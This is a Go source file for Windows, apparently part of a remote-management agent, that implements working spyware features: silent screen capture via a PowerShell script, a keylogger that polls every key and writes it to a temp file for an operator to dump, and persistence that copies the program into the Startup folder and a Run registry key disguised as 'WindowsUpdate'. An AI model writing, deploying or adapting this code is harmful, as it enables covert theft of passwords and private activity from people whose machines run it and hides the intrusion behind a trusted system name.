//go:build windows

package main

import (
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	keylogger        = &windowsKeylogger{}
)

type windowsKeylogger struct {
	mu      sync.Mutex
	file    string
	running bool
	stop    chan struct{}
}

func captureScreenshot() (string, error) {
	// Windows PowerShell is present on supported Windows targets. The Go agent
	// owns the operation and transport; PowerShell only supplies the desktop
	// capture API, avoiding a third-party image dependency.
	script := "$ErrorActionPreference='Stop'; Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object System.Drawing.Bitmap($s.Width,$s.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); $m=New-Object System.IO.MemoryStream; $b.Save($m,[System.Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($m.ToArray()); $g.Dispose(); $b.Dispose(); $m.Dispose()"
	out, err := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("PowerShell capture: %s", strings.TrimSpace(string(out)))
	}
	value := strings.TrimSpace(string(out))
	if _, err := base64.StdEncoding.DecodeString(value); err != nil {
		return "", errors.New("PowerShell returned invalid PNG data")
	}
	return value, nil
}

func keylogAction(action string) (string, string, error) {
	switch strings.ToLower(action) {
	case "start":
		return "", "output", keylogger.start()
	case "stop":
		return "keylogger stopped", "output", keylogger.stopLogging()
	case "dump":
		data, err := keylogger.dump()
		return data, "keylog", err
	default:
		return "", "output", errors.New("use start, stop, or dump")
	}
}

func (k *windowsKeylogger) start() error {
	k.mu.Lock()
	defer k.mu.Unlock()
	if k.running {
		return nil
	}
	path := filepath.Join(os.TempDir(), "minimal-rmm-keylog-"+strconv.FormatInt(time.Now().UnixNano(), 10)+".log")
	k.file, k.running, k.stop = path, true, make(chan struct{})
	go k.loop(path, k.stop)
	return nil
}

func (k *windowsKeylogger) stopLogging() error {
	k.mu.Lock()
	if k.running {
		close(k.stop)
		k.running = false
	}
	k.mu.Unlock()
	return nil
}

func (k *windowsKeylogger) dump() (string, error) {
	k.mu.Lock()
	path := k.file
	k.mu.Unlock()
	if path == "" {
		return "keylogger log not found or not started", nil
	}
	data, err := os.ReadFile(path)
	if os.IsNotExist(err) {
		return "(empty buffer)", nil
	}
	return string(data), err
}

func (k *windowsKeylogger) loop(path string, stop <-chan struct{}) {
	known := make(map[byte]bool)
	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer file.Close()
	for {
		select {
		case <-stop:
			return
		default:
		}
		for vk := 8; vk < 256; vk++ {
			value, _, _ := getAsyncKeyState.Call(uintptr(vk))
			pressed := uint16(value)&0x8000 != 0
			key := byte(vk)
			if pressed && !known[key] {
				known[key] = true
				_, _ = file.WriteString("[" + windowsVirtualKeyName(vk) + "]")
			} else if !pressed {
				delete(known, key)
			}
		}
		_ = file.Sync()
		time.Sleep(40 * time.Millisecond)
	}
}

func windowsVirtualKeyName(vk int) string {
	if vk >= 0x41 && vk <= 0x5A {
		return string(rune(vk))
	}
	if vk >= 0x30 && vk <= 0x39 {
		return string(rune(vk))
	}
	known := map[int]string{8: "BACKSPACE", 9: "TAB", 13: "ENTER", 16: "SHIFT", 17: "CTRL", 18: "ALT", 27: "ESC", 32: "SPACE", 46: "DELETE"}
	if name := known[vk]; name != "" {
		return name
	}
	return strconv.Itoa(vk)
}

func persistenceAction(install bool, cfg *config) (string, error) {
	startup := os.Getenv("APPDATA")
	if startup == "" {
		return "", errors.New("APPDATA is not set")
	}
	path := filepath.Join(startup, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.exe")
	if !install {
		_ = os.Remove(path)
		_, _ = exec.Command("reg.exe", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/f").CombinedOutput()
		return "Persistence removed", nil
	}
	self, err := os.Executable()
	if err != nil {
		return "", err
	}
	if err := os.MkdirAll(filepath.Dir(path), 0700); err != nil {
		return "", err
	}
	if err := copyFile(self, path); err != nil {
		return "", err
	}
	command := fmt.Sprintf(`"%s"`, path)
	if out, err := exec.Command("reg.exe", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", command, "/f").CombinedOutput(); err != nil {
		return "", fmt.Errorf("registry update: %s", strings.TrimSpace(string(out)))
	}
	_ = cfg
	return "Persistence installed successfully", nil
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = out.ReadFrom(in)
	return err
}
